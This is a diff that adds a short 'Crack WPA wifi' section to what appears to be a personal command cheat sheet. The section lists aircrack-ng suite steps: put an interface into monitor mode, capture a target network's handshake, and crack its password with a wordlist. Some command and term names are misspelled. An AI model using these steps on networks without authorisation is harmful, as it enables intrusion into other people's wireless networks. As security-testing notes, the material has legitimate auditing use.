@@ -63,3 +63,22 @@ List possible interfering procceses
 Kill them
 `sudo airmon-ng check kill`
 
+### Crack WPA wifi
+
+Set interface to monitor
+
+`sudo ifconfig wlan0 down`
+`sudo iwconfig wlan0 mode monitor`
+`sudo ifconfig wlan0 up`
+
+Kill all processes that uses the interface
+`sudo airmon-ng check kill`
+
+Start monitoring and get BBSID and channel you need to attack.
+`sudo airomon-ng wlan0`
+
+Specify the BSSID and Channel, and start capture the handshake
+`airodump-ng -c [CHANNEL] --bssid [MAC ADRESS] -w [OUTPUTFILE] wlan0`
+
+Crack the WPA password
+`aircrack-ng -w [WORDLIST] -b [BBSID] [PCAP FILE]`
